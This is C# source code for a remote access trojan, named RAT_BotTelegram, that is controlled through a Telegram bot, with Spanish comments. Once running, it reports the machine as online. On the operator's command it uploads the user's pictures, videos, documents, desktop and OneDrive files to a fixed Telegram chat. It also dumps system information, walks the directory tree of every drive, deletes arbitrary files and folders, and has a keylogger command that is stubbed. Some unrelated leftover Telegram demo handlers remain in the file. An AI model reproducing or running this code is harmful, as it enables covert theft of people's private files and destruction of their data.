using RAT_BotTelegram.Lib;
using System;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Requests;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

namespace RAT_BotTelegram {
    class Program {
        private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TOKEN);
        public static string Path { get; set; }
        static void Main(string[] args) {
            #region Main

            // Copiar
            // Esconder
            // Iniciar script

            //Método que se ejecuta cuando se recibe un mensaje
            Bot.OnMessage += BotOnMessageReceived;

            //Método que se ejecuta cuando se recibe un callbackQuery
            Bot.OnCallbackQuery += BotOnCallbackQueryReceived;

            //Método que se ejecuta cuando se recibe un error
            Bot.OnReceiveError += BotOnReceiveError;

            //Bot.SendDocumentAsync(config.ID, File.Open(path, FileMode.Open));
            //Bot.SendPhotoAsync(config.ID, File.Open(path, FileMode.Open));
            //Bot.SendVideoAsync(config.ID, path);
            

            // Mensaje de conexión

            //Bot.SendTextMessageAsync(config.ID, " ==>>    <b>Computer:</b> " + Features.getUserName() + " <b>is online</b>    <<== ",ParseMode.Html);
            Bot.SendTextMessageAsync(config.ID, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");

            //Bot.SendVideoAsync(config.ID, File.Open(@"F:\New folder (2)\40.3gp",FileMode.Open),999,999,999,"info",ParseMode.Default,false,false);
            
            // Escucha servidor
            Bot.StartReceiving();
            Console.ReadLine();
            Bot.StopReceiving();
            #endregion
        }

        private static async void GetDirectoryAll(string path, int indent = 0) {
            try {
                try {
                    if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
                        foreach (string folder in Directory.GetDirectories(path)) {
                            //Console.WriteLine( "{0}{1}", new string(' ', indent), Path.GetFileName(folder));

                            await Bot.SendTextMessageAsync(config.ID, folder);

                            GetDirectoryAll(folder, indent + 2);
                        }
                    }
                } catch (UnauthorizedAccessException) { }

            } catch {   // Si no encuentra el directorio
                await Bot.SendTextMessageAsync(config.ID, "No se encontró ese directorio en ésta computadora");
            }
        }


        private static async void ListarFiles(string Path) {
            if (Path == "") {
                SendBotMessage("Usted no ingresó una ruta en el comando.\nEjemplo de comando:\n /Dir O:\\OneDrive - xKx\\Photos and Videos of my Life\\2019\\Family  ");
            } else {
                foreach (var file in Tools.GetFile(Path)) {
                    string FData = infoFile(file);
                    await Bot.SendTextMessageAsync(config.ID, "" + FData, ParseMode.Html);
                }
            }
            
        }
        private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
            
            var message = messageEventArgs.Message;

            if (message == null || message.Type != MessageType.Text) return;

            string Command = message.Text.Split(' ').First();           // Case "Comando"
            Path = message.Text.Substring(Command.Length);       // Obtiene el subcomando

            switch (message.Text.Split(' ').First()) {
                #region CommandsFinish 
                case "/Status": // Verifica Si la PC se encuentra en linea
                    await Bot.SendTextMessageAsync(config.ID, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
                    break;
                case "/Show_Information":
                    await Bot.SendTextMessageAsync(config.ID, Tools.PC_Info());
                    break;
                case "/Get_FilesAll":  // Menú Obtiene archivos
                    var GetFiles = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Pictures"        ,callbackData: "GetPictures"),
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Videos"          ,callbackData: "GetVideos"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Documents"       ,callbackData: "GetDocument"),
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Music"           ,callbackData: "GetMusic"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Download"        ,callbackData: "getDownload"),
                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Desktop"         ,callbackData: "getDesktop")
                    }});
                    var GetFilesOneDrive = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Pictures"    ,callbackData: "GetPicturesO"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"      ,callbackData: "GetVideosO"),

                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Documents"    ,callbackData: "GetDocumentO"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Music"        ,callbackData: "GetMusicO"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Desktop"      ,callbackData: "getDesktopO"),
                        InlineKeyboardButton.WithCallbackData(text: "Get all files from OneDrive" ,callbackData: "getAllO")
                    }});
                    var GetFilesOneDriveE = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Imagenes"     ,callbackData: "GetPicturesOE"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"       , callbackData: "GetVideosOE"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Documentos"   ,callbackData: "GetDocumentOE"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Música"       ,callbackData: "GetMusicOE"),
                    },new[]{
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Escritorio"   ,callbackData: "getDesktopOE"),
                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Todos los archivos",callbackData: "getAllO")
                    }});
                    await Bot.SendTextMessageAsync(config.ID, " NOTE: Absolutely all files will be obtained.");
                    await Bot.SendTextMessageAsync(config.ID, "User Files: " + Features.getUserName(), replyMarkup: GetFiles);        // Obtiene USER
                    await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |English| ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
                    await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |Español|", replyMarkup: GetFilesOneDriveE); // Obtiene USER Onedrive
                    break;
 ;
               
                case "/Dir":

                    if (Path.Length <= 4) {
                        SendBotMessage("Si usted desea listar una unidad, hagalo con el comando: \n/Dir_DirectoryDisk\n Ya que el comando /Dir es solo para lisar carpetas especificas y no unidades\n NOTA: Espero en las proximas actualizaciones parchar ese error. ");
                    } else {
                        ListarFiles(Path);
                    }
                    Path = "";
                    break;
                case "/Dir_FolderDisk":
                    var Disk = new InlineKeyboardMarkup(new[]{
                    new[]{
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree C:\\"       ,callbackData: "DDC"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree D:\\"       ,callbackData: "DDD"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree E:\\"       ,callbackData: "DDE"),
                    },new[]{                                                                    
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree F:\\"       ,callbackData: "DDF"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree G:\\"       ,callbackData: "DDG"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree H:\\"       ,callbackData: "DDH"),
                    },new[]{                                                                     
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree I:\\"       ,callbackData: "DDI"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree J:\\"       ,callbackData: "DDJ"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree K:\\"       ,callbackData: "DDK"),
                    },new[]{                                                                   
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree L:\\"       ,callbackData: "DDL"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree M:\\"       ,callbackData: "DDM"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree N:\\"       ,callbackData: "DDN"),
                    },new[]{                                                                      
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree O:\\"       ,callbackData: "DDO"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree P:\\"       ,callbackData: "DDP"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree Q:\\"       ,callbackData: "DDQ"),
                    },new[]{                                                                   
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree R:\\"       ,callbackData: "DDR"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree S:\\"       ,callbackData: "DDS"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree T:\\"       ,callbackData: "DDT"),
                    },new[]{                                                                    
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree U:\\"       ,callbackData: "DDU"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree V:\\"       ,callbackData: "DDV"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree W:\\"       ,callbackData: "DDW"),
                    },new[]{                                                                   
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree X:\\"       ,callbackData: "DDX"),
                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree Z:\\"       ,callbackData: "DDZ"),
                        
                    }});
                    await Bot.SendTextMessageAsync(config.ID, "<b>NOTA: Este proceso puede demorar varios minutos, al culminár habrá un mensaje de FINISH'</b>", ParseMode.Html);
                    await Bot.SendTextMessageAsync(config.ID, "<b>NOTA2 : Se Omitirán directorios Protegidos con permisos especiales o del sistema</b>", ParseMode.Html);
                    await Bot.SendTextMessageAsync(config.ID, "Show directory tree from disk", replyMarkup: Disk);        // Obtiene USER
                    

                    break;
                case "/Get_OnlyFile":
                    if (Path.Length <= 4) {
                        SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
                    } else {
                        GetOnlyFileTelegram(Path);
                    }
                    Path = "";
                    break;
                case "/Delete_OnlyFile":
                    if (Path.Length <= 4) {
                        SendBotMessage("Ejemplo de comando\n /Delete_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Delete_OnlyFile D:\\Documentos\\Monografía.docx");
                    } else {
                        if (Delete(Path)) {
                            SendBotMessage($"Se eliminó  el archivo: {Path} \nCorrectamente");
                        } else {
                            SendBotMessage($"No se pudo eliminar el archivo: {Path} ");
                        }
                    }
                    Path = "";
                    break;
                #endregion

                case "/Keylogger":
                    Path = config.PATH_LOG+"\\"+config.LOG; // Path del archivo log del keylogger
                    
                    Path = "";
                    break;
                
                case "/Delete_Folder":
                    if (Path.Length <= 4) {
                        SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
                    } else {
                        if (Delete(Path,true)) {
                            SendBotMessage($"Se eliminó la Carpeta: {Path} \nCorrectamente");
                        } else {
                            SendBotMessage($"No se pudo eliminar la Carpeta: {Path} ");
                        }
                    }
                    Path = "";
                    break;

                //Mensaje por default
                default:
                    const string usage =
                  "\n/Status                   <Check if the PC is online>" +
                  "\n/Show_Information <get detailed system information>" +     // Muestra información del sistema
                  "\n/Get_FilesAll          |Menu| <Get Files from Computer>" +  //Sube archivos [Imagenes,Fotos, Videos y documentos]
                  "\n/Get_OnlyFile  <Path>   C:\\User\\Photos and videos\\foto34.jpg " +    //Sube solo un archivo especifico.
                  "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subcarpetas.
                  "\n/Dir_FolderDisk     |Menu| Only Folder Tree Drive" +  // Lista Arbol de solo carpetas de Unidades de almacemiento
                  "\n/Keylogger           <Get File log >" +                    // Obtiene el registro de teclas por mensaje
                  "\n/Delete_OnlyFile <Path> " +                                 // Elimina un archivo
                  "\n/Delete_Folder <Path> " +
                  "\n/Help                    <This menu>" +
                  "";
                    await Bot.SendTextMessageAsync(config.ID, "<b> * Use the following commands:</b> *\n" , ParseMode.Html );
                    await Bot.SendTextMessageAsync(config.ID, usage, replyMarkup: new ReplyKeyboardRemove());
                    break;
            }
        }
        private static string infoFile(string file) {  // Muestra información detallada del archivo
            try {
                FileInfo fil = new FileInfo(file);
                string FData =
                    "\n<b>Name =</b> " + fil.Name +
                    "\n<b>Extension =</b> " + fil.Extension +
                    "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
                    "\n<b>Creation Data =</b> " + fil.CreationTime +
                    "\n<b>Is Read Only =</b> " + fil.IsReadOnly +
                    "\n<b>Last Access Time =</b> " + fil.LastAccessTime +
                    "\n<b>Last Write Time =</b> " + fil.LastWriteTime +
                    "\n<b>Directory =</b> " + fil.DirectoryName +
                    "\n<b>Full Directory =</b> " + file;
                return FData;
            } catch  {
                return "Hubo un problema com la ruta";
            }
            
        }
        private static bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
            FileInfo fil = new FileInfo(file);
            var zise = fil.Length;
            // Convierte var en int 
            int MB = int.Parse(zise.ToString());
            // Ejemplo : 44.6MB = 46792411
            // Ejemplo : 95.3KB = 497687
            if (MB >= 49999999) {
                return false;   // Supera los 50MB
            } else {
                return true;    // No supera los 50Mb
            }
        }
        private static bool infoFileZizePhoto(string file) {  // Verifica si el archivo no supera los 50MB
            FileInfo fil = new FileInfo(file);
            var zise = fil.Length;
            // Convierte var en int 
            int MB = int.Parse(zise.ToString());
            // Ejemplo : 44.6MB = 46792411
            // Ejemplo : 95.3KB = 497687
            if (MB >= 9999999) {
                return false;   // Supera los 50MB
            } else {
                return true;    // No supera los 10Mb
            }
        }
        private static bool Delete(string Path, bool folder = false) {
            if (Path != "" || Path != "[-]") {
                try {
                    if (!folder) {
                        File.Delete(Path);
                        if (File.Exists(Path)) {
                            Console.WriteLine("El archivo sigue existiendo.");
                            return false;
                        } else {
                            Console.WriteLine("El archivo ya no existe.");
                            return true;
                        }
                    } else {
                        Directory.Delete(Path, true);
                        //if (Directory.Exists(Path)) {
                        //    Console.WriteLine("No se pudo eliminar la carpeta");
                        //    return false;
                        //} else {
                        //    Console.WriteLine("Se eliminó la carpeta correctamente");
                            return true;

                        //}
                    }   
                } catch {
                    return false;
                }
            } else {
                Console.WriteLine("La ruta ingresada está vacía");
                return false;
            }
           

            
        }
        private async static void GetOnlyFileTelegram(string file) {
            if (file != "") {
                try {
                    if (infoFileZize(file)) {
                        switch (GetFileType(file)) {
                            case "[Imagen]":
                                if (infoFileZizePhoto(file)) {
                                    try {
                                        await Bot.SendPhotoAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                    } catch {
                                        // Enviar como documento.
                                        await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir la imagen, " + GetFileName(file));
                                    }
                                } else {
                                    try {
                                        await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                    } catch {
                                        // Enviar como documento.
                                        await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir la imagen, " + GetFileName(file));
                                    }
                                }
                                break;
                            case "[Video]":
                                try {
                                    await Bot.SendVideoAsync(config.ID, File.Open(file, FileMode.Open));
                                } catch {
                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el video, " + GetFileName(file));

                                }
                                break;
                            case "[Audio]":
                                try {
                                    await Bot.SendAudioAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                } catch (Exception) {
                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el audio, " + GetFileName(file));
                                }
                                break;
                            case "[Doc]":
                                try {
                                    await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                } catch (Exception) {
                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el archivo, " + GetFileName(file));
                                }
                                break;
                            case "[System]": // El archivo se omitidos
                                try {
                                    await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
                                } catch (Exception) {
                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el archivo, " + GetFileName(file));
                                }
                                break;
                            default:
                                await Bot.SendTextMessageAsync(config.ID, "Se ignoró el archivo " + GetFileName(file));
                                break;
                        }
                    } else {
                        await Bot.SendTextMessageAsync(config.ID, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
                    }

                } catch {
                    SendBotMessage("No se encontró el archivo");
                }
            } else {
                SendBotMessage("La Ruta ingresada está vacía");
            }
            
            
        }
        private static async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
            await Bot.SendTextMessageAsync(config.ID, "******************** Start ********************** ");
            if (Tools.GetFile(Path).GetValue(0).ToString() == "[-]") {
                await Bot.SendTextMessageAsync(config.ID, "La carpeta no existe!!, \n\nIntente con otra dirección.");
            } else {
                foreach (var file in Tools.GetFile(Path)) {
                    GetOnlyFileTelegram(file);
                }
            }

            await Bot.SendTextMessageAsync(config.ID, "******************** Finish ********************* ");
        }
        private static async void SendBotMessage(string text = "") {
            await Bot.SendTextMessageAsync(config.ID, text);
        }
        private static string GetFileName(string dir) {   // Retorna solo el nombre del archivo

            if (dir == "[-]") { // Verifica si no hay algún error
                return "[-]";
            }
            //string path = @"D:\PNG Icons\System Win 10\camera.png";
            try {
                /* Utiliza la variable para obtener el ultimo contendor 
                 * =Ejemplo:
                 * [Antes]    path = "C:\User\UserName\Photos\SoyUnaImagen.png" 
                 * [Despues]  path =  "SoyUnaImagen.png"                                                         */
                int palabraClave = dir.LastIndexOf(@"\");
                dir = dir.Substring(palabraClave + 1);
                return dir;
            } catch {
                return "[-]"; // Hubo un problema 
            }

        }
        private static string GetFileType(string File) {
            /* Utiliza la variable para obtener el ultimo contendor 
             * =Ejemplo:
             * [Antes]    path = "SoyUnaImagen.png" 
             * [Despues]  path =  "[Imagen]"             */
            if (File == "[-]") {
                return "[-]";
            }

            string dir = GetFileName(File);
            //string dir2 = dir;       // Solo antibuggeo
            try {
                int palabraClave = dir.LastIndexOf(".");
                dir = dir.Substring(palabraClave + 1);
            } catch {
                return "[-]";
            }

            // Convierte la extensión en minuscula.
            dir = dir.ToLower();
            String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv", "3gp" };
            String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
            String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf" };
            String[] imagen = { "jpg", "jpeg", "png", "bmp", "ico", "jpe", "jpe" };
            String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
                                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
                                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
                                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};

            // Verifica si el archivo es una imagen
            foreach (string ext in imagen) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es una Imagen");  // Solo debug
                    return "[Imagen]";
                }
                Console.WriteLine(dir + " <= No es [Imagen] ");  // Solo debug
            }
            // Verifica si el archivo es una video 
            foreach (string ext in video) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es un Video");  // Solo debug
                    return "[Video]";
                }
                Console.WriteLine(dir + " <= No es [Video] ");  // Solo debug
            }
            // Verifica si el archivo es un Adudio
            foreach (string ext in audio) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es un Audio");  // Solo debug
                    return "[Audio]";
                }
                Console.WriteLine(dir + " <= No es [Audio] ");  // Solo debug
            }
            // Verifica si el archivo es un Documento
            foreach (string ext in doc) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es un Documento");  // Solo debug
                    return "[Doc]";
                }
                Console.WriteLine(dir + " <= No es [Doc] ");  // Solo debug
            }
            // Verifica si el archivo es un Documento
            foreach (string ext in system) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es un System");  // Solo debug
                    return "[System]";
                }
                Console.WriteLine(dir + " <= No es [System] ");  // Solo debug
            }

            return "[-]"; // Extension File
        }
        private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {

            var callbackQuery = callbackQueryEventArgs.CallbackQuery;
            string user = Features.getUserName();
            switch (callbackQuery.Data) {
                
                case "GetPictures":   GetFilesTelegram(@"C:\Users\" + user + @"\Pictures"); SendBotMessage("Finish Command") ; break;                          
                case "GetVideos":     GetFilesTelegram(@"C:\Users\" + user + @"\Videos"); SendBotMessage("Finish Command"); break;                         
                case "GetDocument":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents"); SendBotMessage("Finish Command"); break;
                case "GetMusic":      GetFilesTelegram(@"C:\Users\" + user + @"\Music"); SendBotMessage("Finish Command"); break;                    
                case "GetDownload":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents"); SendBotMessage("Finish Command"); break;                 
                case "GetDesktop":    GetFilesTelegram(@"C:\Users\" + user + @"\Desktop"); SendBotMessage("Finish Command"); break;

                // OneDrive Español
                case "GetPicturesOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Imágenes"); SendBotMessage("Finish Command"); break;                          
                case "GetVideosOE":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); SendBotMessage("Finish Command"); break;                          
                case "GetDocumentOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documentos"); SendBotMessage("Finish Command"); break;                          
                case "GetMusicOE":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Musica"); SendBotMessage("Finish Command"); break;                          
                case "GetDesktopOE":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio"); SendBotMessage("Finish Command"); break;                          
                case "GetgetAllO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive"); SendBotMessage("Finish Command"); break;

                // OneDrive English
                case "GetPicturesO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Pictures"); SendBotMessage("Finish Command"); break;                          
                case "GetVideosO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); SendBotMessage("Finish Command"); break;                         
                case "GetDocumentO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documents"); SendBotMessage("Finish Command"); break;                         
                case "GetMusicO":     GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Música"); SendBotMessage("Finish Command"); break;                         
                case "GetDesktopO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio"); SendBotMessage("Finish Command"); break;
                // "/DirDisk"
               
                case "DDC":    GetDirectoryAll(@"C:\"); SendBotMessage("Finish Command"); break;
                case "DDD":    GetDirectoryAll(@"D:\"); SendBotMessage("Finish Command"); break;
                case "DDE":    GetDirectoryAll(@"E:\"); SendBotMessage("Finish Command"); break;
                case "DDF":    GetDirectoryAll(@"F:\"); SendBotMessage("Finish Command"); break;
                case "DDG":    GetDirectoryAll(@"G:\"); SendBotMessage("Finish Command"); break;
                case "DDH":    GetDirectoryAll(@"H:\"); SendBotMessage("Finish Command"); break;
                case "DDI":    GetDirectoryAll(@"I:\"); SendBotMessage("Finish Command"); break;
                case "DDJ":    GetDirectoryAll(@"J:\"); SendBotMessage("Finish Command"); break;
                case "DDK":    GetDirectoryAll(@"K:\"); SendBotMessage("Finish Command"); break;
                case "DDL":    GetDirectoryAll(@"L:\"); SendBotMessage("Finish Command"); break;
                case "DDM":    GetDirectoryAll(@"M:\"); SendBotMessage("Finish Command"); break;
                case "DDN":    GetDirectoryAll(@"N:\"); SendBotMessage("Finish Command"); break;
                case "DDO":    GetDirectoryAll(@"O:\"); SendBotMessage("Finish Command"); break;
                case "DDP":    GetDirectoryAll(@"P:\"); SendBotMessage("Finish Command"); break;
                case "DDQ":    GetDirectoryAll(@"Q:\"); SendBotMessage("Finish Command"); break;
                case "DDR":    GetDirectoryAll(@"R:\"); SendBotMessage("Finish Command"); break;
                case "DDS":    GetDirectoryAll(@"S:\"); SendBotMessage("Finish Command"); break;
                case "DDT":    GetDirectoryAll(@"T:\"); SendBotMessage("Finish Command"); break;
                case "DDU":    GetDirectoryAll(@"U:\"); SendBotMessage("Finish Command"); break;
                case "DDV":    GetDirectoryAll(@"V:\"); SendBotMessage("Finish Command"); break;
                case "DDW":    GetDirectoryAll(@"W:\"); SendBotMessage("Finish Command"); break;
                case "DDX":    GetDirectoryAll(@"X:\"); SendBotMessage("Finish Command"); break;
                case "DDZ":    GetDirectoryAll(@"Z:\"); SendBotMessage("Finish Command"); break;














                #region Cases de envío de archivos mediante red 


                case "GetDocumenttgert":
                    await Bot.SendLocationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f
                        );
                    break;
                case "botones":
                    await Bot.SendDocumentAsync(chatId: callbackQuery.Message.Chat.Id,document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");

                    ReplyKeyboardMarkup tipoContacto = new[]
                    {
                        new[] { "Opción 1", "Opción 2" },
                        new[] { "Opción 3", "Opción 4" },
                    };

                    await Bot.SendTextMessageAsync(chatId: callbackQuery.Message.Chat.Id, text: "Keyboard personalizado", replyMarkup: tipoContacto);
                    break;

                case "venue":
                    await Bot.SendVenueAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        latitude: 9.932551f,
                        longitude: -84.031086f,
                        title: "Cenfotec",
                        address: "San José, Montes de Oca"
                        );
                    break;

                case "imagen":
                    await Bot.SendPhotoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        photo: "https://www.google.co.cr/imgres?imgurl=https%3A%2F%2Fwww.pcactual.com%2Fmedio%2F2017%2F07%2F05%2Ftelegram_960x540_0aa1aeac.jpg&imgrefurl=https%3A%2F%2Fwww.pcactual.com%2Fnoticias%2Factualidad%2Fsoy-fan-telegram_13549&docid=UZhcuJ9275t8zM&tbnid=otB1G_5L3DD0sM%3A&vet=10ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ..i&w=960&h=540&bih=722&biw=1536&q=telegram%20image&ved=0ahUKEwjR0ouWotDiAhUiqlkKHdi6D8gQMwhLKAEwAQ&iact=mrc&uact=8"
                        );
                    break;

                case "animation":
                    await Bot.SendAnimationAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        animation: "https://techcrunch.com/wp-content/uploads/2015/08/safe_image.gif?w=730&crop=1"
                        );
                    break;

                case "video":
                    await Bot.SendVideoAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        video: "https://res.cloudinary.com/dherrerap/video/upload/v1560039252/WhatsApp_Video_2019-06-08_at_6.10.54_PM.mp4"
                        );
                    break;

                case "document":
                    await Bot.SendDocumentAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
                        );
                    break;

                case "formato":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<b>bold</b>, <strong>bold</strong>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<i>italic</i>, <em>italic</em>",
                        parseMode: ParseMode.Html
                        );
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "<a href='http://www.example.com/'>inline URL</a>",
                        parseMode: ParseMode.Html
                        );
                    break;

                case "reply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "ID: " + callbackQuery.Message.MessageId + " - " + callbackQuery.Message.Text,
                        replyToMessageId: callbackQuery.Message.MessageId);
                    break;

                case "contacto":
                    await Bot.SendContactAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        phoneNumber: "2222-2222",
                        firstName: "Jane",
                        lastName: "Doe"
                        );
                    break;

                case "forceReply":
                    await Bot.SendTextMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        text: "Forzar respuesta a este mensaje",
                        replyMarkup: new ForceReplyMarkup());
                    break;

                case "reenviar":
                    await Bot.ForwardMessageAsync(
                        chatId: callbackQuery.Message.Chat.Id,
                        fromChatId: callbackQuery.Message.Chat.Id,
                        messageId: callbackQuery.Message.MessageId
                        );
                    break;

                    #endregion
            }
        }
        private static void BotOnReceiveError(object sender, ReceiveErrorEventArgs receiveErrorEventArgs) {
            Console.WriteLine("Received error: {0} — {1}",
                receiveErrorEventArgs.ApiRequestException.ErrorCode,
                receiveErrorEventArgs.ApiRequestException.Message);
        }
       
    }
}
